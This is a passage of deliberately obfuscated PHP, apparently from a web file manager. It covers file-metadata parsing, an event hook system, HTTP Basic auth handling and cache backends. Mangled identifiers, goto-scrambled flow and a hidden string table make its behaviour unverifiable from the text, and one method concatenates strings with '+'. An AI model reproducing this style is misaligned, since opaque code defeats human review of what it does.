$DĞÁÅéòÛ‘ = self::pdfParse($B¸‹Ã¼šÉô); } else { $b¿‡Äßøˆ• = self::$fileTypeArray[$aÂÎƒ¬ŸŠ[1611]][$eŸ±È¼¼ƒ[$aÂÎƒ¬ŸŠ[160]]]; $A‡½’ùÆ—î = self::$fileTypeArray[$aÂÎƒ¬ŸŠ[1612]][$b¿‡Äßøˆ•][$aÂÎƒ¬ŸŠ[1613]]; $dÒÄŸ‚‹¾® = @$f¥’ÖÏâÓñ->analyze($B¸‹Ã¼šÉô, $eŸ±È¼¼ƒ[$aÂÎƒ¬ŸŠ[77]], $eŸ±È¼¼ƒ[$aÂÎƒ¬ŸŠ[28]]); $DĞÁÅéòÛ‘ = self::parseData($dÒÄŸ‚‹¾®, $A‡½’ùÆ—î, $eŸ±È¼¼ƒ); } } } catch (Exception $fÏ­«»èÊ) { $DĞÁÅéòÛ‘ = array($aÂÎƒ¬ŸŠ[372] => $b¿‡Äßøˆ•); } if (!$DĞÁÅéòÛ‘) { return; } goto aŠä…‘Ú·¾; Döö×¥ò×: } public static function support($C‘«·¥ÄÍ¶) { goto FÎ«å¼®‹í; FÎ«å¼®‹í: $FŞ¢¤Å˜‡× =& $_SERVER[îÖ]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $C‘«·¥ÄÍ¶ = strtolower($C‘«·¥ÄÍ¶); goto döóÍ“Í¬ˆ; C—Üµ­‡áÔ: return !1; goto bÅ¯£êÏ×¨; döóÍ“Í¬ˆ: $CİÉà¯‚½æ = array($FŞ¢¤Å˜‡×[1610], $FŞ¢¤Å˜‡×[1608]); if (in_array($C‘«·¥ÄÍ¶, $CİÉà¯‚½æ)) { return !0; } if (isset(self::$fileTypeArray[$FŞ¢¤Å˜‡×[1611]][$C‘«·¥ÄÍ¶])) { return !0; } goto C—Üµ­‡áÔ; bÅ¯£êÏ×¨: } private static function parseData($c§˜ï¨ÜÛù, $f¥­áŒÒ¨Á, $c×Í˜Òï¬Œ) { $Aìèøåõ¿ =& $_SERVER[îÖ]; $C„Ä­îæ†ç = $c§˜ï¨ÜÛù[$Aìèøåõ¿[1614]]; $FÊäã ß±¤ = array(); foreach ($f¥­áŒÒ¨Á as $Aé‹–Í»› => $AÄ¬»„˜³‘) { foreach ($AÄ¬»„˜³‘ as $c±š×‘Ù‚é) { if (is_array($c±š×‘Ù‚é)) { $d¸¦¾ƒ·Ê = self::parseData($c§˜ï¨ÜÛù, $AÄ¬»„˜³‘, $c×Í˜Òï¬Œ); if ($d¸¦¾ƒ·Ê) { $FÊäã ß±¤[$Aé‹–Í»›] = $d¸¦¾ƒ·Ê; } break; } $aĞ®‚òÍÁ¾ = str_replace($Aìèøåõ¿[1384], $C„Ä­îæ†ç, $c±š×‘Ù‚é); $d¸¦¾ƒ·Ê = _get($c§˜ï¨ÜÛù, $aĞ®‚òÍÁ¾); $d¸¦¾ƒ·Ê = is_array($d¸¦¾ƒ·Ê) ? $d¸¦¾ƒ·Ê[0] : $d¸¦¾ƒ·Ê; if ($d¸¦¾ƒ·Ê) { break; } } if ($d¸¦¾ƒ·Ê || $d¸¦¾ƒ·Ê === 0 || $d¸¦¾ƒ·Ê === !1) { $d¸¦¾ƒ·Ê = self::valueReset($c±š×‘Ù‚é, $d¸¦¾ƒ·Ê, $Aé‹–Í»›); if ($d¸¦¾ƒ·Ê !== null) { $FÊäã ß±¤[$Aé‹–Í»›] = $d¸¦¾ƒ·Ê; } } } $FÊäã ß±¤ = self::valueResetAll($FÊäã ß±¤, $c×Í˜Òï¬Œ); return $FÊäã ß±¤; } private static function psdParse($e¦õ‘¾¨°) { $d¦âÊ×÷Í =& $_SERVER[îÖ]; if (IO::fileSubstr($e¦õ‘¾¨°, 0, 4) != $d¦âÊ×÷Í[1615]) { return !1; } $a‚‘„ó’¼ = getImageSize($e¦õ‘¾¨°, $Dˆ¿½ÔŞ©); if (!$a‚‘„ó’¼) { return; } $f¬Ÿ”¾ ¹ª = array($d¦âÊ×÷Í[1530] => $a‚‘„ó’¼[0], $d¦âÊ×÷Í[1532] => $a‚‘„ó’¼[1]); return $f¬Ÿ”¾ ¹ª; } private static function pdfParse($b¦½Æ‹¾¬ù) { return FileParsePdf::parse($b¦½Æ‹¾¬ù); } private static function fileTypeParse() { $AØä“ƒ® =& $_SERVER[îÖ]; $aŞÇÀİ²º = self::fileTypeArray(); $dõ»Ó¸­æ÷ = array(); foreach ($aŞÇÀİ²º as $dÂâ¶ÁÜ‹ => $Cï©‹õÆ‡Ê) { $fÀŒ·Â´’ä = _get($Cï©‹õÆ‡Ê, $AØä“ƒ®[160], $AØä“ƒ®[33]); $a»–¡êñ· = is_string($fÀŒ·Â´’ä) ? explode($AØä“ƒ®[47], $fÀŒ·Â´’ä) : $fÀŒ·Â´’ä; if (!$a»–¡êñ·) { continue; } foreach ($a»–¡êñ· as $fÀŒ·Â´’ä) { $fÀŒ·Â´’ä = strtolower(trim($fÀŒ·Â´’ä)); if (!$fÀŒ·Â´’ä) { continue; } $dõ»Ó¸­æ÷[$fÀŒ·Â´’ä] = $dÂâ¶ÁÜ‹; } $aŞÇÀİ²º[$dÂâ¶ÁÜ‹][$AØä“ƒ®[160]] = array_keys($dõ»Ó¸­æ÷); $aŞÇÀİ²º[$dÂâ¶ÁÜ‹][$AØä“ƒ®[1613]] = self::parseKeyMap($Cï©‹õÆ‡Ê[$AØä“ƒ®[1613]]); } return array($AØä“ƒ®[1612] => $aŞÇÀİ²º, $AØä“ƒ®[1611] => $dõ»Ó¸­æ÷); } private static function parseKeyMap($c¤ø…àæ¼Ú) { $Ašƒ–µ¹¢ =& $_SERVER[îÖ]; foreach ($c¤ø…àæ¼Ú as $b½óˆÂÊİ” => $bƒæ®¶ˆó) { if (is_array($bƒæ®¶ˆó)) { $cÈ‚‚Ò¯ğ = self::parseKeyMap($bƒæ®¶ˆó); if ($cÈ‚‚Ò¯ğ) { $c¤ø…àæ¼Ú[$b½óˆÂÊİ”] = $cÈ‚‚Ò¯ğ; } continue; } $fÂ¬³‚‚øÁ = explode($Ašƒ–µ¹¢[47], $bƒæ®¶ˆó); $dØ”è¯¾   = array(); foreach ($fÂ¬³‚‚øÁ as $C˜§®…„Ù) { $C˜§®…„Ù = trim($C˜§®…„Ù); if (!$C˜§®…„Ù) { continue; } if (preg_match($Ašƒ–µ¹¢[1616], $C˜§®…„Ù, $cÏ¡ÕõŸˆÍ)) { $böØå ˜Š = explode($Ašƒ–µ¹¢[271], $cÏ¡ÕõŸˆÍ[1]); foreach ($böØå ˜Š as $CõÙÚ‘Û´Ç) { $dØ”è¯¾  [] = str_replace($cÏ¡ÕõŸˆÍ[0], $CõÙÚ‘Û´Ç, $C˜§®…„Ù); } } else { $dØ”è¯¾  [] = $C˜§®…„Ù; } } $c¤ø…àæ¼Ú[$b½óˆÂÊİ”] = $dØ”è¯¾  ; } return $c¤ø…àæ¼Ú; } private static function valueResetAll($E®÷‘íâãß, $dóÙÀ—øÜ) { goto eñÔ£—´ÛÓ; Cï ø„á™: return $E®÷‘íâãß; goto f…Š›Æ¦æ˜; DÕÁòÍ‰¤÷: $D‚Ù•Ş¼Œè = _get($E®÷‘íâãß, $föî„ äÈò[1629], $föî„ äÈò[33]); $B×îˆ©íĞ» = $Bˆ™¤ƒÓ‡¯ . $eĞø÷ãö . $D‚Ù•Ş¼Œè; if ($B×îˆ©íĞ» && get_charset($B×îˆ©íĞ») != $föî„ äÈò[326]) { $E®÷‘íâãß[$föî„ äÈò[1626]][$föî„ äÈò[1337]] = iconv_to($E®÷‘íâãß[$föî„ äÈò[1626]][$föî„ äÈò[1337]], get_charset($B×îˆ©íĞ»), $föî„ äÈò[326]); $E®÷‘íâãß[$föî„ äÈò[1626]][$föî„ äÈò[1630]] = iconv_to($E®÷‘íâãß[$föî„ äÈò[1626]][$föî„ äÈò[1630]], get_charset($B×îˆ©íĞ»), $föî„ äÈò[326]); $E®÷‘íâãß[$föî„ äÈò[1626]][$föî„ äÈò[1631]] = iconv_to($E®÷‘íâãß[$föî„ äÈò[1626]][$föî„ äÈò[1631]], get_charset($B×îˆ©íĞ»), $föî„ äÈò[326]); } goto Cï ø„á™; eñÔ£—´ÛÓ: $föî„ äÈò =& $_SERVER[îÖ]; if (isset($E®÷‘íâãß[$föî„ äÈò[1617]])) { $c²„‡£è¸ = ceil($E®÷‘íâãß[$föî„ äÈò[1617]]); $aìé™ÓçÄ’ = intval($c²„‡£è¸ / 3600); $D…ÉØâ¨ = intval(($c²„‡£è¸ - $aìé™ÓçÄ’ * 3600) / 60); $B¾çÅªàÖò = $c²„‡£è¸ % 60; $E®÷‘íâãß[$föî„ äÈò[1618]] = sprintf($föî„ äÈò[1619], $aìé™ÓçÄ’, $D…ÉØâ¨, $B¾çÅªàÖò); if ($aìé™ÓçÄ’ == 0) { $E®÷‘íâãß[$föî„ äÈò[1618]] = sprintf($föî„ äÈò[1620], $D…ÉØâ¨, $B¾çÅªàÖò); } } $EÏ„ñØŒ¯ = _get($E®÷‘íâãß, $föî„ äÈò[1621]); goto D§‰¶»çÌ; D§‰¶»çÌ: if ($EÏ„ñØŒ¯) { $f£ßÔ¦®á” = IO_PATH_SYSTEM_TEMP . $föî„ äÈò[1622] . KodIO::hashPath($dóÙÀ—øÜ) . $föî„ äÈò[1623]; $E®÷‘íâãß[$föî„ äÈò[1624]] = Action($föî„ äÈò[1625])->pluginCacheFileSet($f£ßÔ¦®á”, $EÏ„ñØŒ¯); unset($E®÷‘íâãß[$föî„ äÈò[1626]][$föî„ äÈò[1609]]); } $Bˆ™¤ƒÓ‡¯ = _get($E®÷‘íâãß, $föî„ äÈò[1627], $föî„ äÈò[33]); $eĞø÷ãö = _get($E®÷‘íâãß, $föî„ äÈò[1628], $föî„ äÈò[33]); goto DÕÁòÍ‰¤÷; f…Š›Æ¦æ˜: } private static function valueReset($aƒ… éõ¬Ä, $F‡Ë„°¯¶, $FÖÆëÖ²Â±) { $d©¡¥ºå‹‘ =& $_SERVER[îÖ]; $d°ì•§”» = $d©¡¥ºå‹‘[1547]; switch ($aƒ… éõ¬Ä) { case $d©¡¥ºå‹‘[1632]: $F‡Ë„°¯¶ = $F‡Ë„°¯¶ == $d©¡¥ºå‹‘[83] ? $d©¡¥ºå‹‘[1633] : $d©¡¥ºå‹‘[1634]; break; case $d©¡¥ºå‹‘[1635]: $F‡Ë„°¯¶ = $F‡Ë„°¯¶ ? $F‡Ë„°¯¶ : null; break; default: break; } switch ($FÖÆëÖ²Â±) { case $d©¡¥ºå‹‘[1636]: $F‡Ë„°¯¶ = round($F‡Ë„°¯¶, 2); break; case $d©¡¥ºå‹‘[187]: case $d©¡¥ºå‹‘[107]: if ($F‡Ë„°¯¶ < 0) { $F‡Ë„°¯¶ = null; } else { if (is_numeric($F‡Ë„°¯¶)) { $F‡Ë„°¯¶ = date($d°ì•§”», $F‡Ë„°¯¶); } } break; default: break; } return $F‡Ë„°¯¶; } private static function fileTypeArray() { $B”¨¥…É÷÷ =& $_SERVER[îÖ]; return array($B”¨¥…É÷÷[1609] => array($B”¨¥…É÷÷[160] => $B”¨¥…É÷÷[1637] . $B”¨¥…É÷÷[1638], $B”¨¥…É÷÷[1613] => array($B”¨¥…É÷÷[1530] => $B”¨¥…É÷÷[1639], $B”¨¥…É÷÷[1532] => $B”¨¥…É÷÷[1640], $B”¨¥…É÷÷[1641] => $B”¨¥…É÷÷[1642], $B”¨¥…É÷÷[1643] => $B”¨¥…É÷÷[1644], $B”¨¥…É÷÷[187] => $B”¨¥…É÷÷[1645], $B”¨¥…É÷÷[107] => $B”¨¥…É÷÷[1646], $B”¨¥…É÷÷[1647] => $B”¨¥…É÷÷[1648], $B”¨¥…É÷÷[1649] => $B”¨¥…É÷÷[1650], $B”¨¥…É÷÷[1651] => $B”¨¥…É÷÷[1652], $B”¨¥…É÷÷[1653] => $B”¨¥…É÷÷[1654], $B”¨¥…É÷÷[1655] => $B”¨¥…É÷÷[1656], $B”¨¥…É÷÷[1657] => $B”¨¥…É÷÷[1658], $B”¨¥…É÷÷[1659] => $B”¨¥…É÷÷[1660], $B”¨¥…É÷÷[1661] => array($B”¨¥…É÷÷[1662] => $B”¨¥…É÷÷[1663], $B”¨¥…É÷÷[1664] => $B”¨¥…É÷÷[1665], $B”¨¥…É÷÷[1666] => $B”¨¥…É÷÷[1667]), $B”¨¥…É÷÷[1668] => $B”¨¥…É÷÷[1669], $B”¨¥…É÷÷[1670] => $B”¨¥…É÷÷[1671], $B”¨¥…É÷÷[1672] => $B”¨¥…É÷÷[1673], $B”¨¥…É÷÷[1674] => $B”¨¥…É÷÷[1675], $B”¨¥…É÷÷[1676] => array($B”¨¥…É÷÷[1677] => $B”¨¥…É÷÷[1678], $B”¨¥…É÷÷[1679] => $B”¨¥…É÷÷[1680], $B”¨¥…É÷÷[1681] => $B”¨¥…É÷÷[1682], $B”¨¥…É÷÷[1683] => $B”¨¥…É÷÷[1684], $B”¨¥…É÷÷[1685] => $B”¨¥…É÷÷[1686], $B”¨¥…É÷÷[1687] => $B”¨¥…É÷÷[1688], $B”¨¥…É÷÷[1689] => $B”¨¥…É÷÷[1690], $B”¨¥…É÷÷[1691] => $B”¨¥…É÷÷[1692], $B”¨¥…É÷÷[1693] => $B”¨¥…É÷÷[1694], $B”¨¥…É÷÷[1695] => $B”¨¥…É÷÷[1696], $B”¨¥…É÷÷[1697] => $B”¨¥…É÷÷[1698]))), $B”¨¥…É÷÷[1699] => array($B”¨¥…É÷÷[160] => $B”¨¥…É÷÷[1700] . $B”¨¥…É÷÷[1701], $B”¨¥…É÷÷[1613] => array($B”¨¥…É÷÷[1617] => $B”¨¥…É÷÷[1702], $B”¨¥…É÷÷[187] => $B”¨¥…É÷÷[1703], $B”¨¥…É÷÷[107] => $B”¨¥…É÷÷[1704], $B”¨¥…É÷÷[1649] => $B”¨¥…É÷÷[1705], $B”¨¥…É÷÷[1706] => $B”¨¥…É÷÷[1707], $B”¨¥…É÷÷[1708] => $B”¨¥…É÷÷[1635], $B”¨¥…É÷÷[1709] => $B”¨¥…É÷÷[1710], $B”¨¥…É÷÷[1711] => $B”¨¥…É÷÷[1712], $B”¨¥…É÷÷[1713] => $B”¨¥…É÷÷[1714], $B”¨¥…É÷÷[1626] => array($B”¨¥…É÷÷[1337] => $B”¨¥…É÷÷[1715], $B”¨¥…É÷÷[1630] => $B”¨¥…É÷÷[1716], $B”¨¥…É÷÷[1631] => $B”¨¥…É÷÷[1717], $B”¨¥…É÷÷[1718] => $B”¨¥…É÷÷[1719], $B”¨¥…É÷÷[1720] => $B”¨¥…É÷÷[1721], $B”¨¥…É÷÷[1722] => $B”¨¥…É÷÷[1723], $B”¨¥…É÷÷[1609] => $B”¨¥…É÷÷[1724]))), $B”¨¥…É÷÷[1725] => array($B”¨¥…É÷÷[160] => $B”¨¥…É÷÷[1726] . $B”¨¥…É÷÷[1727], $B”¨¥…É÷÷[1613] => array($B”¨¥…É÷÷[1530] => $B”¨¥…É÷÷[1728], $B”¨¥…É÷÷[1532] => $B”¨¥…É÷÷[1729], $B”¨¥…É÷÷[1617] => $B”¨¥…É÷÷[1702], $B”¨¥…É÷÷[187] => $B”¨¥…É÷÷[1730], $B”¨¥…É÷÷[107] => $B”¨¥…É÷÷[1731], $B”¨¥…É÷÷[1636] => $B”¨¥…É÷÷[1732], $B”¨¥…É÷÷[1713] => $B”¨¥…É÷÷[1733], $B”¨¥…É÷÷[1709] => $B”¨¥…É÷÷[1734], $B”¨¥…É÷÷[1649] => $B”¨¥…É÷÷[1735], $B”¨¥…É÷÷[1699] => array($B”¨¥…É÷÷[1708] => $B”¨¥…É÷÷[1635], $B”¨¥…É÷÷[1736] => $B”¨¥…É÷÷[1737], $B”¨¥…É÷÷[1706] => $B”¨¥…É÷÷[1707], $B”¨¥…É÷÷[1713] => $B”¨¥…É÷÷[1714], $B”¨¥…É÷÷[1709] => $B”¨¥…É÷÷[1738], $B”¨¥…É÷÷[1711] => $B”¨¥…É÷÷[1712]))), $B”¨¥…É÷÷[1739] => array($B”¨¥…É÷÷[1613] => array($B”¨¥…É÷÷[1740] => $B”¨¥…É÷÷[1741], $B”¨¥…É÷÷[1742] => $B”¨¥…É÷÷[1743])), $B”¨¥…É÷÷[1744] => array($B”¨¥…É÷÷[1613] => array())); } } class Hook { private static $events = array(); public static function get($eè‘ˆÂ«’— = false) { if (!$eè‘ˆÂ«’—) { return self::$events; } else { return self::$events[$eè‘ˆÂ«’—]; } } public static function apply($aÉ„õçÃ…Œ, $f§¸¿·™ = array()) { $AãÖˆ¨Û™Ú = ActionApply($aÉ„õçÃ…Œ, $f§¸¿·™); if (is_string($aÉ„õçÃ…Œ)) { Hook::trigger($aÉ„õçÃ…Œ); } return $AãÖˆ¨Û™Ú; } public static function bind($bµÃ¨©ö×¢, $Fê šØø•Ş, $B™œÏ‘¾¿Ö = false) { $A¾†ÀõŒ =& $_SERVER[îÖ]; if (!isset(self::$events[$bµÃ¨©ö×¢])) { self::$events[$bµÃ¨©ö×¢] = array(); } self::$events[$bµÃ¨©ö×¢][] = array($A¾†ÀõŒ[1745] => $Fê šØø•Ş, $A¾†ÀõŒ[1746] => $B™œÏ‘¾¿Ö, $A¾†ÀõŒ[1747] => 0); } public static function once($a–µô¨Øóº, $EÑ¼Š›½‰¿) { self::bind($a–µô¨Øóº, $EÑ¼Š›½‰¿, !0); } public static function unbind($f„×îô½²«, $C¨Îİ­‰Æ = false) { if (!$C¨Îİ­‰Æ) { self::$events[$f„×îô½²«] = array(); return; } $cÛ»‚š­‹Œ = self::$events[$f„×îô½²«]; self::$events[$f„×îô½²«] = array(); if (!is_array($cÛ»‚š­‹Œ)) { return; } for ($EöÃà¥³ÛŒ = 0; $EöÃà¥³ÛŒ < count($cÛ»‚š­‹Œ); $EöÃà¥³ÛŒ++) { if ($cÛ»‚š­‹Œ[$EöÃà¥³ÛŒ][$_SERVER[îÖ][1745]] == $C¨Îİ­‰Æ) { continue; } self::$events[$f„×îô½²«][] = $cÛ»‚š­‹Œ[$EöÃà¥³ÛŒ]; } } public static function filter($f²‹õ¼ó Ë, $CÁ›°ª»¿¼) { goto b®‡§×É; a¥ãô¬¥Š½: for ($c‰ÈåéÂèÍ = 0; $c‰ÈåéÂèÍ < count($Dâ³®Œˆª); $c‰ÈåéÂèÍ++) { $eó¥ŸèÕö = $Dâ³®Œˆª[$c‰ÈåéÂèÍ]; if ($eó¥ŸèÕö[$b‹£Ç½‡ß[1746]] && $eó¥ŸèÕö[$b‹£Ç½‡ß[1747]] > 1) { continue; } self::$events[$f²‹õ¼ó Ë][$c‰ÈåéÂèÍ][$b‹£Ç½‡ß[1747]] = $eó¥ŸèÕö[$b‹£Ç½‡ß[1747]] + 1; $dÒ‚Ü§Ø§ = self::apply($eó¥ŸèÕö[$b‹£Ç½‡ß[1745]], array($d±¿£áØÕ¨)); if (gettype($dÒ‚Ü§Ø§) == gettype($d±¿£áØÕ¨)) { $d±¿£áØÕ¨ = $dÒ‚Ü§Ø§; } } return $d±¿£áØÕ¨; goto FÊ¿Š›á‹; EÂ‘áÏ’ÂÆ: $Dâ³®Œˆª = $CÔ“¬í²Ä[$f²‹õ¼ó Ë]; $d±¿£áØÕ¨ = $CÁ›°ª»¿¼; if (!is_array($Dâ³®Œˆª) || count($Dâ³®Œˆª) == 0) { return $d±¿£áØÕ¨; } goto a¥ãô¬¥Š½; b®‡§×É: $b‹£Ç½‡ß =& $_SERVER[îÖ]; $CÔ“¬í²Ä = self::$events; if (!isset($CÔ“¬í²Ä[$f²‹õ¼ó Ë])) { return $CÁ›°ª»¿¼; } goto EÂ‘áÏ’ÂÆ; FÊ¿Š›á‹: } public static function trigger($bÜˆ“ÌĞòä) { goto CÈìå¼¨Ÿª; F¨«Ùš„à½: if (!isset($c°°é»Å•·[$bÜˆ“ÌĞòä])) { return $cÄ–è¨Ú×õ; } $aõ®öÂ Á = $c°°é»Å•·[$bÜˆ“ÌĞòä]; if (!is_array($aõ®öÂ Á) || count($aõ®öÂ Á) == 0) { return $cÄ–è¨Ú×õ; } goto A¹Ü”©‚‰Ä; E®ÍŠñ‹: return $cÄ–è¨Ú×õ; goto BĞ£¶¡‚‚×; A¹Ü”©‚‰Ä: $eÎÖ¯Ï–Û = func_get_args(); array_shift($eÎÖ¯Ï–Û); for ($Fˆå§©éì¾ = 0; $Fˆå§©éì¾ < count($aõ®öÂ Á); $Fˆå§©éì¾++) { $F±‚Æï££ = $aõ®öÂ Á[$Fˆå§©éì¾]; if ($F±‚Æï££[$bß¾³İ¶[1746]] && $F±‚Æï££[$bß¾³İ¶[1747]] > 1) { continue; } if (defined($bß¾³İ¶[1748]) && GLOBAL_LOG_HOOK) { write_log($bÜˆ“ÌĞòä . $bß¾³İ¶[1749] . $F±‚Æï££[$bß¾³İ¶[1745]], $bß¾³İ¶[1750]); } self::$events[$bÜˆ“ÌĞòä][$Fˆå§©éì¾][$bß¾³İ¶[1747]] = $F±‚Æï££[$bß¾³İ¶[1747]] + 1; $F÷…¯¯àô = self::apply($F±‚Æï££[$bß¾³İ¶[1745]], $eÎÖ¯Ï–Û); if (defined($bß¾³İ¶[1748]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $bß¾³İ¶[1750]); if ($F±‚Æï££[$bß¾³İ¶[1747]] == 200) { $c“ƒğÏÂá÷ = is_array($F±‚Æï££[$bß¾³İ¶[1745]]) ? json_encode_force($F±‚Æï££[$bß¾³İ¶[1745]]) : $F±‚Æï££[$bß¾³İ¶[1745]]; write_log($bß¾³İ¶[1751] . $bÜˆ“ÌĞòä . $bß¾³İ¶[1752] . $c“ƒğÏÂá÷, $bß¾³İ¶[1753]); } } $cÄ–è¨Ú×õ = is_null($F÷…¯¯àô) ? $cÄ–è¨Ú×õ : $F÷…¯¯àô; } goto E®ÍŠñ‹; CÈìå¼¨Ÿª: $bß¾³İ¶ =& $_SERVER[îÖ]; $c°°é»Å•· = self::$events; $cÄ–è¨Ú×õ = !1; goto F¨«Ùš„à½; BĞ£¶¡‚‚×: } } class HttpAuth { public static function get() { $D¸ï›±¿“ =& $_SERVER[îÖ]; $E¼õÈõ¶Ê = $D¸ï›±¿“[33]; $CÊ‘àÉ° = $D¸ï›±¿“[33]; if (isset($_SERVER[$D¸ï›±¿“[1754]])) { $E¼õÈõ¶Ê = $_SERVER[$D¸ï›±¿“[1754]]; $CÊ‘àÉ° = $_SERVER[$D¸ï›±¿“[1755]]; } elseif (isset($_SERVER[$D¸ï›±¿“[1756]])) { $AŒ¦ò™ù = $_SERVER[$D¸ï›±¿“[1756]]; if (strpos(strtolower($AŒ¦ò™ù), $D¸ï›±¿“[1757]) === 0) { $Aö…ÀÖß”ª = explode($D¸ï›±¿“[4], base64_decode(substr($AŒ¦ò™ù, 6))); $E¼õÈõ¶Ê = isset($Aö…ÀÖß”ª[0]) ? $Aö…ÀÖß”ª[0] : $D¸ï›±¿“[33]; $CÊ‘àÉ° = isset($Aö…ÀÖß”ª[1]) ? $Aö…ÀÖß”ª[1] : 0; } } return array($D¸ï›±¿“[535] => $E¼õÈõ¶Ê, $D¸ï›±¿“[891] => $CÊ‘àÉ°); } public static function error() { goto FìŒ¨™Èù; f˜à»ëŒñ: header($b™¸˜Àƒ[1760]); header($b™¸˜Àƒ[1761]); header($b™¸˜Àƒ[1257]); goto Bˆò¥­Ó˜; FìŒ¨™Èù: $b™¸˜Àƒ =& $_SERVER[îÖ]; header($b™¸˜Àƒ[1758]); header($b™¸˜Àƒ[1759]); goto f˜à»ëŒñ; Bˆò¥­Ó˜: die; goto F¹àáªÏø£; F¹àáªÏø£: } public static function make($DÁõ÷º‰ê¤, $FÆ´‰ßÀßÈ) { $a¥«²Á°ï =& $_SERVER[îÖ]; return $a¥«²Á°ï[1762] + base64_encode($DÁõ÷º‰ê¤ . $a¥«²Á°ï[4] . $FÆ´‰ßÀßÈ); } } goto BŠ«á†»¬•; AËõŞÔ›”: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto CÑÖ’Ÿ¨ƒØ; CÑÖ’Ÿ¨ƒØ: $F‰Êå–‡ß‚ =& $_SERVER[îÖ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto Fï°İâ·Ë; EçØß¦Ù¹¬: switch ($D­ï•×Â [$F‰Êå–‡ß‚[754]]) { case $F‰Êå–‡ß‚[17]: self::$handle = Model($F‰Êå–‡ß‚[756]); break; case $F‰Êå–‡ß‚[757]: self::$handle = new CacheRedis($bÕ¤ïŒ‡«, $d¤î‹®†Š¼); break; case $F‰Êå–‡ß‚[758]: self::$handle = new CacheMemcached($bÕ¤ïŒ‡«, $d¤î‹®†Š¼); break; case $F‰Êå–‡ß‚[167]: self::$handle = new CacheFile($bÕ¤ïŒ‡«, $d¤î‹®†Š¼); break; default: break; } return self::$handle; goto dâÙâ…¯Š; Fï°İâ·Ë: $D­ï•×Â  = $GLOBALS[$F‰Êå–‡ß‚[6]][$F‰Êå–‡ß‚[337]]; $bÕ¤ïŒ‡« = $D­ï•×Â [$D­ï•×Â [$F‰Êå–‡ß‚[754]]]; $d¤î‹®†Š¼ = $D­ï•×Â [$F‰Êå–‡ß‚[755]]; goto EçØß¦Ù¹¬; dâÙâ…¯Š: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($B«³Î„óÚ) { if (is_array($B«³Î„óÚ) || is_object($B«³Î„óÚ)) { $B«³Î„óÚ = json_encode($B«³Î„óÚ); } $B«³Î„óÚ = rawurlencode($B«³Î„óÚ); return KOD_SITE_ID . $_SERVER[îÖ][70] . $B«³Î„óÚ; } public static function get($e¤óËˆÏĞ) { $CÑìóĞ§Á = self::key($e¤óËˆÏĞ); if (!isset(self::$memoryCache[$CÑìóĞ§Á])) { $C×¹¥àŞŒ = self::init()->get($CÑìóĞ§Á); self::$memoryCache[$CÑìóĞ§Á] = unserialize($C×¹¥àŞŒ); } return self::$memoryCache[$CÑìóĞ§Á]; } public static function set($f°Ú÷È, $aÁÅÌ¦Äœ¡, $cÍ”Í‘ÄÄĞ = false) { goto CéÈª…–Âá; D‘ÆÑè®æ: CacheLock::unlock($f°Ú÷È); return $f§”Ú£¯¦À; goto eÍ½„Ñğòù; e›éÂÎôÏ: CacheLock::lock($f°Ú÷È); $f§”Ú£¯¦À = self::init()->set($a¨¶ÑÀÈå, serialize($aÁÅÌ¦Äœ¡), $cÍ”Í‘ÄÄĞ); self::$memoryCache[$a¨¶ÑÀÈå] = $aÁÅÌ¦Äœ¡; goto D‘ÆÑè®æ; CéÈª…–Âá: $a¨¶ÑÀÈå = self::key($f°Ú÷È); if (isset(self::$memoryCache[$a¨¶ÑÀÈå]) && self::$memoryCache[$a¨¶ÑÀÈå] === $aÁÅÌ¦Äœ¡) { return !0; } if ($cÍ”Í‘ÄÄĞ === 0) { self::$memoryCache[$a¨¶ÑÀÈå] = $aÁÅÌ¦Äœ¡; return !0; } goto e›éÂÎôÏ; eÍ½„Ñğòù: } public static function remove($AÜáöî•Ú) { goto A½İ¢öÏæ†; A½İ¢öÏæ†: $f°®‹ˆ©Æ = self::key($AÜáöî•Ú); unset(self::$memoryCache[$f°®‹ˆ©Æ]); self::clearTimeout(); goto F³ÔœãäÛ; F³ÔœãäÛ: CacheLock::lock($AÜáöî•Ú); $f¬‹íª¼ò« = self::init()->remove($f°®‹ˆ©Æ); CacheLock::unlock($AÜáöî•Ú); goto BÆÌµ’œƒÚ; BÆÌµ’œƒÚ: return $f¬‹íª¼ò«; goto EÛ©é ªğ™; EÛ©é ªğ™: } public static function clearMemory($fÌºì×öá = false) { if ($fÌºì×öá) { $fÌºì×öá = self::key($fÌºì×öá); unset(self::$memoryCache[$fÌºì×öá]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[îÖ][759])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[îÖ][760])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($EÄÈ…æáÔ, $D°±¹œ¨Ë×) { $aîİ–óŞä =& $_SERVER[îÖ]; $this->cachePath = $EÄÈ…æáÔ[$aîİ–óŞä[75]]; $this->prefix = $aîİ–óŞä[761]; $this->cacheTime = $D°±¹œ¨Ë×; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($F„¶¬é¯¿…) { $EÄÚ³¡¿µ =& $_SERVER[îÖ]; $F„¶¬é¯¿… = str_replace(array($EÄÚ³¡¿µ[762], $EÄÚ³¡¿µ[93], $EÄÚ³¡¿µ[69]), $EÄÚ³¡¿µ[763], $F„¶¬é¯¿…); return $this->cachePath . $EÄÚ³¡¿µ[764] . $F„¶¬é¯¿… . $EÄÚ³¡¿µ[765]; } public function set($fÈğµÍ¡ğ, $AŠêºáÉÔÎ, $DÓˆ‡³á‚ = false) { $dèÌ¼Ó‹ = $this->getFile($fÈğµÍ¡ğ); if (file_put_contents($dèÌ¼Ó‹, $this->prefix . $AŠêºáÉÔÎ, LOCK_EX)) { return !0; } @unlink($dèÌ¼Ó‹); return !1; } public function get($eïŠ°Û—‚í) { $dŒÌ·˜ÔÓŸ = $this->getFile($eïŠ°Û—‚í); if (file_exists($dŒÌ·˜ÔÓŸ) && filemtime($dŒÌ·˜ÔÓŸ) < time() - $this->cacheTime) { @unlink($dŒÌ·˜ÔÓŸ); return !1; } $a•ÒÊ…¡Á = @file_get_contents($dŒÌ·˜ÔÓŸ); return substr($a•ÒÊ…¡Á, strlen($this->prefix)); } public function remove($eïµŞ’¢Ç½) { $cêÔÖåÑÎ½ = 